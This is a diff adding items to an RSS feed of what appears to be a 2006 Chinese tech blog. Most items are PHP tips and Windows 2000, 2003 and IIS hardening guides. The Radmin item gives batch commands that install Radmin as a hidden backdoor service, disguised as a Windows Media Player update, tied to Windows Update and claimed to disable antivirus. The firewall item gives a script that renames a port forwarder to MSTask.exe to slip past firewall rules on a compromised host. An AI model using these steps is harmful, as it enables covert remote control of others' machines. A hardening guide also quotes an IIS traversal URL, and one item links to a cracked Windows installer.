+在DreamHost上一键装了WordPress2.0,发现自己实在懒得要命,连上传WordPress2.0都懒了:( 试用了下下,感觉比1.5强很多,应该说规范很多,许多细节和功能的变化还是很舒心的,加入了期待已久的TinyMCE,上传部份也整合到了发表页面,等等 这下升级1.5.2到2.0又得花些时间了,最怕这样升级</description>
+    </item>
+    
+    <item>
+      <title>在php中怎么判断一个变量是不是数字？</title>
+      <link>http://example.org/2006/02/26/e59ca8phpe4b8ade6808ee4b988e588a4e696ade4b880e4b8aae58f98e9878fe698afe4b88de698afe695b0e5ad97efbc9f/</link>
+      <pubDate>Sun, 26 Feb 2006 09:41:47 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/26/e59ca8phpe4b8ade6808ee4b988e588a4e696ade4b880e4b8aae58f98e9878fe698afe4b88de698afe695b0e5ad97efbc9f/</guid>
+      <description>is_numeric($xxx)；</description>
+    </item>
+    
+    <item>
+      <title>PHP木马的攻击的防御之道</title>
+      <link>http://example.org/2006/02/25/phpe69ca8e9a9ace79a84e694bbe587bbe79a84e998b2e5bea1e4b98be98193/</link>
+      <pubDate>Sat, 25 Feb 2006 16:17:53 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/phpe69ca8e9a9ace79a84e694bbe587bbe79a84e998b2e5bea1e4b98be98193/</guid>
+      <description>1.防止跳出web目录　首先修改httpd.conf,如果你只允许你的php脚本程序在web目录里操作，还可以修改httpd.conf文件限制php的操作路径。比如你的web目录是/usr/local/apache/htdocs，那么在httpd.conf里加上这么几行：　php_admin_value open_basedir /usr/local/apache /htdocs 这样，如果脚本要读取/usr/local/apache/htdocs以外的文件将不会被允许，如果错误显示打开的话会提示这样的错误：
+Warning: open_basedir restriction in effect. File is in wrong directory in
+/usr/local/apache/htdocs/open.php on line 4
+等等。
+2.防止php木马执行webshell
+打开safe_mode,
+在,php.ini中设置
+disable_functions= passthru,exec,shell_exec,system　二者选一即可,也可都选</description>
+    </item>
+    
+    <item>
+      <title>WIN服务器PHP软件下载</title>
+      <link>http://example.org/2006/02/25/wine69c8de58aa1e599a8phpe8bdafe4bbb6e4b88be8bdbd/</link>
+      <pubDate>Sat, 25 Feb 2006 16:16:57 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/wine69c8de58aa1e599a8phpe8bdafe4bbb6e4b88be8bdbd/</guid>
+      <description>phpMyAdmin for Windows V2.7.0 http://www.skycn.com/soft/10687.html
+php-4.4.0 http://cn.php.net/get/php-4.4.0-Win32.zip/from/a/mirror
+mysql-4.0.26-win32 http://download.discuz.net/mysql-4.0.26-win32.zip
+ZendOptimizer-2.6.2-Windows-i386 http://www.mepoor.net/attachment/ZendOptimizer-2.6.2-Windows-i386.exe</description>
+    </item>
+    
+    <item>
+      <title>给win2003打开fso读写权限</title>
+      <link>http://example.org/2006/02/25/e7bb99win2003e68993e5bc80fsoe8afbbe58699e69d83e99990/</link>
+      <pubDate>Sat, 25 Feb 2006 16:16:09 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e7bb99win2003e68993e5bc80fsoe8afbbe58699e69d83e99990/</guid>
+      <description>默认的windows2003是没有打开fso读写权限的,我用的是企业版的win2003,打开fso权限直截运行regsvr32 scrrun.dll即可.然后重启你的机算机,一切ok.</description>
+    </item>
+    
+    <item>
+      <title>打造完美Radmin</title>
+      <link>http://example.org/2006/02/25/e68993e980a0e5ae8ce7be8eradmin/</link>
+      <pubDate>Sat, 25 Feb 2006 16:15:24 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e68993e980a0e5ae8ce7be8eradmin/</guid>
+      <description>大家好，关于如何打造出完美的Radmin服务端，网上有很多类似的修改后的程序，但有的服务名会暴露，有的会显示CMD窗口，我弥补了它们的缺点，综合了它们的优点，打造出了现在这个完美的Radmin服务端。
+准备工具 Rock免杀工具； IcoSprite图标更改器； Killer15杀杀毒软件防火墙工具； SC.exe服务添加删除更改工具； AdmDll.dll、Raddrv.dll、R_server（这个不用说了吧，Radmin的服务端）。
+程序特点 自解压形式，双击即可，自动解压到%systemroot%\system32\drivers\目录下，并能干掉卡巴斯基等杀毒软件。使用vbs嵌套bat来执行所有内容，不会跳出任何窗口。自建服务，并修改服务名、显示名、描述使其做到隐蔽。依存Windows Update服务，给试图关闭它带来困惑。做完一切后以只读，隐藏形式隐蔽Radmin服务端的三个程序，删除掉生成的一些REG、BAT、VBS文件，并能够突破Radmin外部连接进来时XP SP2防火墙的拦截。
+制作过程 首先自己安装一下Radmin服务端，配置完密码，端口等信息后导出其在HKEY_LOCAL_MACHINE\SYSTEM\RAdmin的注册表文件，这里我另存为名Server.reg。然后要修改R_server.exe的图标并修改文件名为迷惑性文字如Update.exe，修改图标我用IcoSprite，觉得还不错。这样假如对方装有天网之类防火墙的话，可以骗过一些菜鸟，同意允许对外连接。 接下来我们制作核心部分，最关键的BAT，重要的我将简单解释： @echo off @sc stop r_server ‘假如已经被装过R_server服务，先用SC将它停掉。 @sc delete r_server ‘将已经装过R_server服务删除。 @regedit /s server.reg @SC create MPservice BinPath= &amp;ldquo;%systemroot%\system32\drivers\Update.exe /service&amp;rdquo; type= own type= interact start= auto DisplayName= &amp;ldquo;Media Player of Remote Control Driver Update&amp;rdquo; ‘这句是用SC建立一个服务，服务名为Mpservice，路径Binpath为&amp;quot;%systemroot%\system32\drivers\Update.exe /service&amp;quot;，类型type为 own 与interact交互，启动类型start为 自动，显示名DisplayName为&amp;quot;Media Player of Remote Control Driver Update&amp;quot;。 @sc description MPservice &amp;ldquo;为Windows Media Player提供加载进程及驱动程序、库提供基层更新安全补丁的服务。&amp;rdquo; ‘这句是将MPservice服务的描述改为“为Windows Media Player提供加载进程及驱动程序、库提供基层更新安全补丁的服务。” @sc config wuauserv depend= MPservice ‘配置MPservice使wuauserv服务依存此服务（wuauserv可以根据自己喜欢改成其它服务，这里的wuauserv是系统在Windows Update 网站的自动更新服务）。这里的目的是迷惑管理员，使其不敢轻易停止我们生成的Radmin服务。 @echo Windows Registry Editor Version 5.</description>
+    </item>
+    
+    <item>
+      <title>通杀国内防火墙</title>
+      <link>http://example.org/2006/02/25/e9809ae69d80e59bbde58685e998b2e781abe5a299/</link>
+      <pubDate>Sat, 25 Feb 2006 16:14:44 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e9809ae69d80e59bbde58685e998b2e781abe5a299/</guid>
+      <description>直以来都有一个梦想：偶要是能发现些漏洞或BUG什么的该多好啊！于是整天对着电脑瞎弄瞎研究，研究什么呢？研究如何突破防火墙（偶这里指的防火墙是软体型的个人防火墙，硬件的偶也没条件。）嘿嘿，你还别说，还真没白研究，还真给偶发现了大多数防火墙的通病。这个BUG能让我们欺骗防火墙来达到访外的目的，具体情况是怎么样的呢？请看下面的解说！ 首先，我要介绍一下Windows系统特性，当一个程序运行时，它不能删除，但却能够改名！而当系统里的被保护程序遭到删除或损坏或改名时系统就会及时调用备份文件给予还原！我再讲讲防火墙，大家都知道许多防火墙的“应用程序规则”里一般默认就会让IE浏览器（iexplore.exe）、Outlook Express（msimn.exe）、lsass.exe、spoolsv.exe、MSTask.exe、winlogon.exe、services.exe、svchost.exe通过，而大多的防火墙认为只要是与规则里的路径及文件名相同就Pass！以这样的检测方法来决定是否放行，但它却完全没考虑到如果是别的文件替换的呢？——就相当于古装片里的易容术，易容后就认不得了！这就给了我们机会，我们可以利用这个BUG来欺骗防火墙来达到访外的目的！ 小知识：其实现在大多木马采用的DLL插线程技术也就是利用了这个原理，它们首先隐蔽的开启一个认证放行的程序进程（如Iexplore.exe进程），接着把DLL型木马插入这个线程内，然后访外时就可轻松突破防火墙的限制了——因为防火墙是不会拦截已认证放行的程序的。 原理讲完了，我们现在讲讲该如何利用这个BUG了！这里我用虚拟机做实验，制造如下条件： 为了更符合现实，我给服务器安装了“天网防火墙”、Radmin（但由于防火墙指定了访问IP地址，所以没办法正常连接！），MSSQL SERVER、Serv-u。首先我们用常用的方法进行端口转发，看看防火墙有什么反应！ 第一步，启用AngelShell Ver 1.0里的Fport（用来进行端口转发的服务端，几乎可以转发任何端口），然后在本地用FportClient（用来进行端口转发的客户端）监听好！ 第二步，直接在CMDSHELL里运行“e:\www\fport.exe 4899 192.168.1.1 7788”，这时我们看到虚拟机里的“天网”对Fport马上进行了拦截。
+看到了吧！由于Fport并不是认证放行的，防火墙马上就进行了拦截！OK，现在我们实行欺骗计划，看偶如何突破防火墙的！还是执行第一步，然后新建一个批处理，内容如下： ren MSTask.exe MSTask1.exe ren fport.exe MSTask.exe MSTask.exe 4899 192.168.1.1 7788 Del %0 命名为go.bat，接着用SqlRootKit把“Fport.exe”和go.bat 一起copy到目标机子的c:\winnt\system32\（也就是MSTask所在的目录）在SqlRootKit里执行go.bat（注意如果要改MSTask.exe的名的话就需要有管理员权限）。 当FportClient出现“已经接受到远程计算机的连接！”时，用Radmin客户端连接本机的4899端口。
+我们已经成功突破限制（由于防火墙没有限制本地连接4899端口，我们用Fport转发了它的端口，登录时等于本地连接，因此我们能够成功连接），这样一来，我们本不能逃过防火墙的Fport便变成了一个有“插线程”技术的端口转发工具了！ 据我实验，国内的防火墙几乎无一例外的“拥有”这个BUG！虽然这个BUG不会带来什么大的危害，但总是给入侵者多了一个黑我们的机会！ WTF老大说独乐乐不如众乐乐，所以我还是公布出来了，一是可以让我们国内的防火墙有所改进，二是给网管们提个醒！由于小弟技术有限，难免会出现错误，欢迎各位指正批评。
+N/P （NetPatch） 来 源： 《黑客防线》</description>
+    </item>
+    
+    <item>
+      <title>WIN2000服务器安全配置全攻略</title>
+      <link>http://example.org/2006/02/25/win2000e69c8de58aa1e599a8e5ae89e585a8e9858de7bdaee585a8e694bbe795a5/</link>
+      <pubDate>Sat, 25 Feb 2006 16:13:35 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/win2000e69c8de58aa1e599a8e5ae89e585a8e9858de7bdaee585a8e694bbe795a5/</guid>
+      <description>WIN2000服务器安全配置全攻略：目前，WIN2000 SERVER是比较流行的服务器操作系统之一，但是要想安全的配置微软的这个操作系统，却不是一件容易的事。本文试图对win2000 SERVER的安全配置进行初步的探讨。
+一、 定制自己的WIN2000 SERVER
+1．版本的选择：WIN2000有各种语言的版本，对于我们来说，可以选择英文版或简体中文版，我强烈建议：在语言不成为障碍的情况下，请一定使用英文版。要知道，微软的产品是以Bug &amp;amp; Patch而著称的，中文版的Bug远远多于英文版，而补丁一般还会迟至少半个月（也就是说一般微软公布了漏洞后你的机子还会有半个月处于无保护状况）
+2．组件的定制：win2000在默认情况下会安装一些常用的组件，但是正是这个默认安装是极度危险的（米特尼科说过，他可以进入任何一台默认安装的服务器，我虽然不敢这么说，不过如果你的主机是WIN2000 SERVER的默认安装，我可以告诉你，你死定了）你应该确切的知道你需要哪些服务，而且仅仅安装你确实需要的服务，根据安全原则，最少的服务+最小的权限=最大的安全。典型的WEB服务器需要的最小组件选择是：只安装IIS的Com Files，IIS Snap-In，WWW Server组件。如果你确实需要安装其他组件，请慎重，特别是：Indexing Service, FrontPage 2000 Server Extensions, Internet Service Manager (HTML)这几个危险服务。
+3． 管理应用程序的选择
+选择一个好的远程管理软件是非常重要的事，这不仅仅是安全方面的要求，也是应用方面的需要。Win2000的Terminal Service是基于RDP（远程桌面协议）的远程控制软件，他的速度快，操作方便，比较适合用来进行常规操作。但是，Terminal Service也有其不足之处，由于它使用的是虚拟桌面，再加上微软编程的不严谨，当你使用Terminal Service进行安装软件或重起服务器等与真实桌面交互的操作时，往往会出现哭笑不得的现象，例如：使用Terminal Service重起微软的认证服务器（Compaq, IBM等）可能会直接关机。所以，为了安全起见，我建议你再配备一个远程控制软件作为辅助，和Terminal Service互补，象PcAnyWhere就是一个不错的选择。
+二、 正确安装WIN2000 SERVER
+1．分区和逻辑盘的分配，有一些朋友为了省事，将硬盘仅仅分为一个逻辑盘，所有的软件都装在C驱上，这是很不好的，建议最少建立两个分区，一个系统分区，一个应用程序分区，这是因为，微软的IIS经常会有泄漏源码/溢出的漏洞，如果把系统和IIS放在同一个驱动器会导致系统文件的泄漏甚至入侵者远程获取ADMIN。推荐的安全配置是建立三个逻辑驱动器，第一个大于2G，用来装系统和重要的日志文件，第二个放IIS，第三个放FTP，这样无论IIS或FTP出了安全漏洞都不会直接影响到系统目录和系统文件。要知道，IIS和FTP是对外服务的，比较容易出问题。而把IIS和FTP分开主要是为了防止入侵者上传程序并从IIS中运行。（这个可能会导致程序开发人员和编辑的苦恼，管他呢，反正你是管理员J）
+2．安装顺序的选择：不要觉得：顺序有什么重要？只要安装好了，怎么装都可以的。错！win2000在安装中有几个顺序是一定要注意的：
+首先，何时接入网络：Win2000在安装时有一个漏洞，在你输入Administrator密码后，系统就建立了ADMIN$的共享，但是并没有用你刚刚输入的密码来保护它，这种情况一直持续到你再次启动后，在此期间，任何人都可以通过ADMIN$进入你的机器；同时，只要安装一完成，各种服务就会自动运行，而这时的服务器是满身漏洞，非常容易进入的，因此，在完全安装并配置好win2000 SERVER之前，一定不要把主机接入网络。
+其次，补丁的安装：补丁的安装应该在所有应用程序安装完之后，因为补丁程序往往要替换/修改某些系统文件，如果先安装补丁再安装应用程序有可能导致补丁不能起到应有的效果，例如：IIS的HotFix就要求每次更改IIS的配置都需要安装（变不变态？）
+三、 安全配置WIN2000 SERVER
+即使正确的安装了WIN2000 SERVER，系统还是有很多的漏洞，还需要进一步进行细致地配置。
+1．端口：端口是计算机和外部网络相连的逻辑接口，也是计算机的第一道屏障，端口配置正确与否直接影响到主机的安全，一般来说，仅打开你需要使用的端口会比较安全，配置的方法是在网卡属性-TCP/IP-高级-选项-TCP/IP筛选中启用TCP/IP筛选，不过对于win2000的端口过滤来说，有一个不好的特性：只能规定开哪些端口，不能规定关闭哪些端口，这样对于需要开大量端口的用户就比较痛苦。
+2．IIS：IIS是微软的组件中漏洞最多的一个，平均两三个月就要出一个漏洞，而微软的IIS默认安装又实在不敢恭维，所以IIS的配置是我们的重点，现在大家跟着我一起来：
+首先，把C盘那个什么Inetpub目录彻底删掉，在D盘建一个Inetpub（要是你不放心用默认目录名也可以改一个名字，但是自己要记得）在IIS管理器中将主目录指向D:\Inetpub；
+其次，那个IIS安装时默认的什么scripts等虚拟目录一概删除（罪恶之源呀，忘http://www.target.com/scripts/..%c1%1c../winnt/system32/cmd.exe了？我们虽然已经把Inetpub从系统盘挪出来了，但是还是小心为上），如果你需要什么权限的目录可以自己慢慢建，需要什么权限开什么。（特别注意写权限和执行程序的权限，没有绝对的必要千万不要给）
+第三，应用程序配置：在IIS管理器中删除必须之外的任何无用映射，必须指的是ASP, ASA和其他你确实需要用到的文件类型，例如你用到stml等（使用server side include），实际上90%的主机有了上面两个映射就够了，其余的映射几乎每个都有一个凄惨的故事：htw, htr, idq, ida……想知道这些故事？去查以前的漏洞列表吧。什么？找不到在哪里删？在IIS管理器中右击主机-&amp;gt;属性-&amp;gt;WWW服务编辑-&amp;gt;主目录配置-&amp;gt;应用程序映射，然后就开始一个个删吧（里面没有全选的，嘿嘿）。接着在刚刚那个窗口的应用程序调试书签内将脚本错误消息改为发送文本（除非你想ASP出错的时候用户知道你的程序/网络/数据库结构）错误文本写什么？随便你喜欢，自己看着办。点击确定退出时别忘了让虚拟站点继承你设定的属性。
+为了对付日益增多的cgi漏洞扫描器，还有一个小技巧可以参考，在IIS中将HTTP404 Object Not Found出错页面通过URL重定向到一个定制HTM文件，可以让目前绝大多数CGI漏洞扫描器失灵。其实原因很简单，大多数CGI扫描器在编写时为了方便，都是通过查看返回页面的HTTP代码来判断漏洞是否存在的，例如，著名的IDQ漏洞一般都是通过取1.idq来检验，如果返回HTTP200，就认为是有这个漏洞，反之如果返回HTTP404就认为没有，如果你通过URL将HTTP404出错信息重定向到HTTP404.htm文件，那么所有的扫描无论存不存在漏洞都会返回HTTP200，90%的CGI扫描器会认为你什么漏洞都有，结果反而掩盖了你真正的漏洞，让入侵者茫然无处下手（武侠小说中常说全身漏洞反而无懈可击，难道说的就是这个境界？）不过从个人角度来说，我还是认为扎扎实实做好安全设置比这样的小技巧重要的多。
+最后，为了保险起见，你可以使用IIS的备份功能，将刚刚的设定全部备份下来，这样就可以随时恢复IIS的安全配置。还有，如果你怕IIS负荷过高导致服务器满负荷死机，也可以在性能中打开CPU限制，例如将IIS的最大CPU使用率限制在70%。
+3．账号安全：
+Win2000的账号安全是另一个重点，首先，Win2000的默认安装允许任何用户通过空用户得到系统所有账号/共享列表，这个本来是为了方便局域网用户共享文件的，但是一个远程用户也可以得到你的用户列表并使用暴力法破解用户密码。很多朋友都知道可以通过更改注册表Local_Machine\System\CurrentControlSet\Control\LSA-RestrictAnonymous = 1来禁止139空连接，实际上win2000的本地安全策略（如果是域服务器就是在域服务器安全和域安全策略中）就有这样的选项RestrictAnonymous（匿名连接的额外限制），这个选项有三个值：
+0：None. Rely on default permissions（无，取决于默认的权限）</description>
+    </item>
+    
+    <item>
+      <title>加固Wind2003平台的WEB服务器</title>
+      <link>http://example.org/2006/02/25/e58aa0e59bbawind2003e5b9b3e58fb0e79a84webe69c8de58aa1e599a8/</link>
+      <pubDate>Sat, 25 Feb 2006 16:12:03 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e58aa0e59bbawind2003e5b9b3e58fb0e79a84webe69c8de58aa1e599a8/</guid>
+      <description>基于Windows平台下IIS运行的网站总给人一种感觉就是脆弱。早期的IIS确实存在很多问题，不过我个人认为自从Windows Server 2003发布后，IIS6及Windows Server 2003新的安全特性、更加完善的管理功能和系统的稳定性都有很大的增强。虽然从Windows Server 2003上可以看到微软不准备再发展ASP，特别是不再对Access数据库的完好支持，但是面对它的那些优势迫使我不得不舍弃Windows 2000 Server。况且我也不需要运行太多的ASP+Access，因为我的程序都是PHP+MySQL(说实话我不喜欢微软的ASP和ASPNET)，而且我确实信赖Windows Server 2003!
+服务器、网站，看到这些词大家都会想到什么，不只是性能更加关注的是它的安全问题。很多人都无法做到非常完美的安全加固，因为大部分的资料都来源互联网，而互联网的资料总不是那么详尽，毕竟每个服务器的应用环境及运行程序不同。
+我从事互联网这个行业只有2年时间，其间遇到了很多问题，我所管理的服务器部分是开放式(PUBLIC)的，它是向互联网的用户敞开的，所以我所面临的问题就更加的多!安全性首当其要，其次是系统的稳定性，最后才是性能。要知道服务器上存在很多格式各样的应用程序，有些程序本身就有缺陷，轻者造成服务器当机，严重的会危及到服务器的整个数据安全。
+举个例子，有一台运行着300多个网站的Windows 2000 Server，一段时间里它经常Down机，发现内存泄漏特别快，几分钟时间内存使用立刻飙升到900M甚至高达1.2G，这个时候通过远程是无法访问服务器了，但是服务器系统本身却还在运行着。这个问题着实让我头疼了很长一段时间，因为如果要排查故障就要从这些网站入手，而网站的数量阻碍了我的解决进度。后来通过Filemon监控文件读取来缩小排查范围，之后对可疑网站进行隔离，最终找到故障点并解决。要知道一段小小的代码就可以让运行IIS5的 Windows 2000 Server 挂掉!而在Windows Server 2003下，应用程序的级别低中高级变更为了程序池，这样我们就可以对一个池进行设置对内存和CPU进行保护。它的这一特性让我减轻了很多的工作量并且系统也稳定了很多。
+另外严重的就是安全性的问题了，无论任何文章都有一个宗旨就是尽量在服务器少开放端口，并开放必要的服务，禁止安装与服务器无关的应用程序。在 Windows 2000 Server中，目录权限都是Everyone，很多服务都是以SYSTEM权限来运行的，如Serv-U FTP 这款出色的FTP服务器平台曾经害苦了不少人，它的溢出漏洞可以使入侵者轻松的获取系统完全控制权，如果做到呢?就是因为Serv-U FTP服务使用SYSTEM权限来运行，SYSTEM的权利比Administrator的权利可大的多，注册表SAM项它是可以直接访问和修改的，这样入侵者便利用这一特性轻松在注册表中克隆一个超级管理员账号并获取对系统的完全控制权限。
+我的目标:加固WEB服务器系统，使之提高并完善其稳定性及安全性。
+系统环境:Windows Server 2003 Enterprise Edition With Service Pack 1(以下简称W2k3SP1)，WEB平台为IIS6，FTP平台为Serv-U FTP Server
+安装配置操作系统
+安装操作系统，在安装前先要先去调整服务器的BIOS设置，关闭不需要的I/O，这样节省资源又可以避免一些硬件驱动问题。务必断开服务器与网络的连接，在系统没有完成安全配置前不要将它接入网络。在安装过程中如果网卡是PNP类型的，那么应当为其网络属性只配置允许使用TCP/IP协议，并关闭在 TCP/IP上的NETBIOS，为了提供更安全的保证，应该启用TCP/IP筛选，并不开放任何TCP端口。完成操作系统的安装后，首次启动 W2K3SP1，会弹出安全警告界面，主要是让你立刻在线升级系统更新补丁，并配置自动更新功能，这个人性化的功能是W2K3SP1所独有的，在没有关闭这个警告窗口前，系统是一个安全运行的状态，这时我们应当尽快完成系统的在线更新。
+修改Administrator和Guest这两个账号的密码使其口令变的复杂，并通过组策略工具为这两个敏感账号更名。修改位置在组策略中Computer Configuration-Windows Settings-Security Setting-Local Policies-Security Options下，这样做可以避免入侵者马上发动对此账号的密码穷举攻击。
+服务器通常都是通过远程进行管理的，所以我使用系统自带的组件 “远程桌面”来对系统进行远程管理。之所以选择它，因为它是系统自带的组件缺省安装只需要去启用它就可以使用，支持驱动器映射、剪切板映射等应用，并且只要客户端是WindowsXP PRO都会自带连接组件非常方便，最主要还有一点它是免费的。当然第三方优秀的软件也有如:PCAnyWhere，使用它可以解决Remote Desktop无法在本地环境模式下工作的缺点。为了防止入侵者轻易地发现此服务并使用穷举攻击手段，可以修改远程桌面的监听端口:
+运行 Regedt32 并转到此项: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+注意:上面的注册表项是一个路径;它已换行以便于阅读。
+2. 找到“PortNumber”子项，您会看到值 00000D3D，它是 3389 的十六进制表示形式。使用十六进制数值修改此端口号，并保存新值。
+要更改终端服务器上某个特定连接的端口，请按照下列步骤操作: 运行 Regedt32 并转到此项:</description>
+    </item>
+    
+    <item>
+      <title>如何设置虚拟主机访问权限</title>
+      <link>http://example.org/2006/02/25/e5a682e4bd95e8aebee7bdaee8999ae68b9fe4b8bbe69cbae8aebfe997aee69d83e99990/</link>
+      <pubDate>Sat, 25 Feb 2006 16:09:20 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e5a682e4bd95e8aebee7bdaee8999ae68b9fe4b8bbe69cbae8aebfe997aee69d83e99990/</guid>
+      <description>经常听到用户这样问冷刀:拥有虚拟站点的主机，该如何才能设置好用户的访问权呢? 笔者考虑了许久之后，决定借以此文回复“一度抱怨”冷刀没给答案的同志们! 其实这个问题提的很好，关于用户权限的设置确实里面蕴藏的很大的学文。权限小与大，是直接决定主机是否安全的关键，请看下文为您“量身”定做虚拟站点权限的套装! 1.首先双击“我的电脑”图标，进入操作界面。然后右击“D盘符”图标，弹出快捷菜单，选择“属性”选项，并单击“安全”栏，在到下方名称处选择Everyone用户组，并且勾选读取运行、列出文件目录、读取这三个权限，其它权限如有选中，请将其去掉。 2.单击“高级”按扭，弹出访问控制窗体，在次选择Everyone用户组，去掉“重置所有子对象的权限”复选框选项(如图1)，然后单击“确定”按钮。回到属性安全栏并选择Everyone用户组，最后单击右上角 “删除”按扭，将其删除即可。
+小提示:删除了EVERYONE用户组，含义是使普通用户不能越权，而且ASP还可以正常使用。为了安全起见，其它目录也按其相同操作即可。 3.右击桌面“我的电脑”图标，单击“管理”选项，弹出计算机管理窗体。展开左侧本地用户和组，选择下方“用户”标签，按右键弹出快捷菜单，单击“新建用户”按钮。输入:leilei，设置密码为永不过期(如图2)，再单击隶属于将其加入GUEST用户组。然后进入IIS设置虚拟站点，并设置站点目录为E:\网站资源\BBSXP 5.12 正式版 ]\bbsxp(如图3)，在单击目录安全性栏目“编辑”按扭，并勾选“匿名访问”复选框，设置用户名、密码与新建leilei用户相同，最后单击“确定”按钮即可。
+小提示: LEILEI这名用户是笔者随意建立的普通用户，大家在这里不必拘束，可以随意建立自己喜欢的名字。将LEILEI用户加入GUEST组，代表远程LEILEI用户可以访问本机。 然后并在IIS虚拟站点中设置了LEILEI这名用户访问权限，为远程来宾。 总结:就这样非常轻松的解决，LEILEI用户设置权限的问题。以上我们又做了非常健全的越权限制， 就算黑客得到了此用户，也只是来宾用户，丝毫危机不到你的电脑、IIS虚拟站点的安全问题，相信足以排除提升权限的忧患了。</description>
+    </item>
+    
+    <item>
+      <title>Windows2003下Asp配置技巧</title>
+      <link>http://example.org/2006/02/25/windows2003e4b88baspe9858de7bdaee68a80e5b7a7/</link>
+      <pubDate>Sat, 25 Feb 2006 16:08:38 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/windows2003e4b88baspe9858de7bdaee68a80e5b7a7/</guid>
+      <description>装了2003以后，默认支持.net架构，抛弃了asp，所以刚刚安装了IIS的时候，访问是会出错的，错误提示为 Error Code 16389 超出系统资源 这是没有手动配置asp环境的缘故。
+在 IIS 6.0 中，默认设置是特别严格和安全的，这样可以最大限度地减少因以前太宽松的超时和限制而造成的攻击。比如说默认配置数据库属性实施的最大 ASP 张贴大小为 204,800 个字节，并将各个字段限制为 100 KB。在 IIS 6.0 之前的版本中，没有张贴限制。导致我们学校里面的应用系统往2003移植经常会出错。这几天走了几个学校发现了一些问题，现汇总解决方案如下。 一、启用Asp支持 Windows Server 2003 默认安装，是不安装 IIS 6 的，需要另外安装。安装完 IIS 6，还需要单独开启对于 ASP 的支持。
+第一步，启用Asp，进入： 控制面板 - 管理工具 -IIS(Internet 服务器)- Web服务扩展 - Active Server Pages - 允许 控制面板 - 管理工具 -IIS(Internet 服务器)- Web服务扩展 - 在服务端的包含文件 - 允许 第二步,启用父路径支持。 IIS-网站－主目录－配置－选项－启用父路径 第三步，权限分配 IIS-网站－（具体站点）－（右键）权限－Users完全控制
+二、解决windows2003最大只能上载200K的限制。 先在服务里关闭iis admin service服务，找到windows\system32\inesrv\下的metabase.xml,打开，找到ASPMaxRequestEntityAllowed 把他修改为需要的值，然后重启iis admin service服务 1、在web服务扩展 允许 active server pages和在服务器端的包含文件 2、修改各站点的属性 主目录－配置－选项－启用父路径 3、使之可以上传大于 200k的文件(修改成您要的大小就可以了，如在后面补两个0，就允许20m了) c:\WINDOWS\system32\inetsrv\MetaBase.</description>
+    </item>
+    
+    <item>
+      <title>Windows Server 2003 安全配置</title>
+      <link>http://example.org/2006/02/25/windows-server-2003-e5ae89e585a8e9858de7bdae/</link>
+      <pubDate>Sat, 25 Feb 2006 16:07:40 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/windows-server-2003-e5ae89e585a8e9858de7bdae/</guid>
+      <description>windows server2003是目前最为成熟的网络服务器平台，安全性相对于windows 2000有大大的提高,但是2003默认的安全配置不一定适合我们的需要，所以，我们要根据实际情况来对win2003进行全面安全配置。说实话，安全配置是一项比较有难度的网络技术，权限配置的太严格，好多程序又运行不起，权限配置的太松，又很容易被黑客入侵，做为网络管理员，真的很头痛，因此，我结合这几年的网络安全管理经验，总结出以下一些方法来提高我们服务器的安全性。 第一招：正确划分文件系统格式，选择稳定的操作系统安装盘 为了提高安全性，服务器的文件系统格式一定要划分成NTFS（新技术文件系统）格式，它比FAT16、FAT32的安全性、空间利用率都大大的提高，我们可以通过它来配置文件的安全性，磁盘配额、EPS文件加密等。如果你已经分成FAT32的格式了，可以用CONVERT 盘符 /FS：NTFS /V 来把FAT32转换成NTFS格式。正确安装windows 2003 server,在网安联盟http://cqhk.14023.com/Soft/yyrj/bigsoft/200504/502.asp&amp;gt;有windows 2003的企业可升级版，这个一个完全破解了的版本，可以直接网上升级,我们安装时尽量只安装我们必须要用的组件，安装完后打上最新的补丁，到网上升级到最新版本！保证操作系统本身无漏洞。 第二招：正确设置磁盘的安全性,具体如下(虚拟机的安全设置，我们以asp程序为例子)重点：
+1、系统盘权限设置 C:分区部分： c:\ administrators 全部(该文件夹，子文件夹及文件) CREATOR OWNER 全部(只有子文件来及文件) system 全部(该文件夹，子文件夹及文件) IIS_WPG 创建文件/写入数据(只有该文件夹) IIS_WPG(该文件夹，子文件夹及文件) 遍历文件夹/运行文件 列出文件夹/读取数据 读取属性 创建文件夹/附加数据 读取权限 c:\Documents and Settings administrators 全部(该文件夹，子文件夹及文件) Power Users (该文件夹，子文件夹及文件) 读取和运行 列出文件夹目录 读取 SYSTEM全部(该文件夹，子文件夹及文件) C:\Program Files administrators 全部(该文件夹，子文件夹及文件) CREATOR OWNER全部(只有子文件来及文件) IIS_WPG (该文件夹，子文件夹及文件) 读取和运行 列出文件夹目录 读取 Power Users(该文件夹，子文件夹及文件) 修改权限 SYSTEM全部(该文件夹，子文件夹及文件) TERMINAL SERVER USER (该文件夹，子文件夹及文件) 修改权限 2、网站及虚拟机权限设置(比如网站在E盘) 说明：我们假设网站全部在E盘wwwsite目录下，并且为每一个虚拟机创建了一个guest用户，用户名为vhost1…vhostn并且创建了一个webuser组，把所有的vhost用户全部加入这个webuser组里面方便管理 E:\ Administrators全部(该文件夹，子文件夹及文件) E:\wwwsite Administrators全部(该文件夹，子文件夹及文件) system全部(该文件夹，子文件夹及文件) service全部(该文件夹，子文件夹及文件) E:\wwwsite\vhost1 Administrators全部(该文件夹，子文件夹及文件) system全部(该文件夹，子文件夹及文件) vhost1全部(该文件夹，子文件夹及文件) 3、数据备份盘 数据备份盘最好只指定一个特定的用户对它有完全操作的权限 比如F盘为数据备份盘，我们只指定一个管理员对它有完全操作的权限 4、其它地方的权限设置 请找到c盘的这些文件，把安全性设置只有特定的管理员有完全操作权限 下列这些文件只允许administrators访问 net.</description>
+    </item>
+    
+    <item>
+      <title>ASP安全配置不完全手册</title>
+      <link>http://example.org/2006/02/25/aspe5ae89e585a8e9858de7bdaee4b88de5ae8ce585a8e6898be5868c/</link>
+      <pubDate>Sat, 25 Feb 2006 16:06:27 +0000</pubDate>
+      
